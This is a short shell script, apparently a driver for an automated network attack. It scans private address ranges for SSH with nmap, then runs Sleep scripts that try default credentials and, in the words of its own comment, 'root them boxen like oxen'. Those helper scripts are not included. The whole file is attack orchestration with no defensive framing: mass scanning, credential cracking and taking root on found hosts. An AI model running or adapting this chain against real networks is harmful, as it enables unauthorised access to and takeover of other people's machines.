export HOSTS="192.168.21.0/24 192.168.22.0/24 192.168.23.0/24 192.168.24.0/24 192.168.25.0/24 192.168.26.0/24 192.168.27.0/24 192.168.28.0/24"
export HOSTS="192.168.95.0/24"

# scan for hosts
nmap -T5 -p22 $HOSTS -oG tmp/hosts.txt

# fix the list of hosts
java -jar lib/sleep.jar scripts/fixlist.sl >tmp/ips.txt

# look for any default credentials
java -Xmx1024M -jar lib/sleep.jar scripts/crack.sl >tmp/ready.txt

# root them boxen like oxen...
java -Xmx1024M -jar lib/sleep.jar scripts/rooter.sl
